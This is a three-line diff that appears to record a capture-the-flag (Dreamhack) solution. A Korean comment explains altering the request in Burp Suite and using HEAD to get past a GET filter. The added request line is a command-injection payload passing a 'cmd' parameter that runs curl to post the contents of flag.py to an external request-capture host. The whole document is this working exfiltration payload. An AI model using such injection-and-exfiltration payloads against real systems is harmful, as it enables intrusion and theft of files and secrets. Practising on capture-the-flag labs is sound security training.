@@ -1,0 +1,3 @@
+
+#burp suite으로 requests 수정. get을 피해야 하기 때문에 HEAD로. 드림핵 툴 사용해서 주소 생성 미리 해줘야함.
+HEAD /?cmd=curl+https://unjxhdh.request.dreamhack.games/+-d+"$(cat+flag.py)"
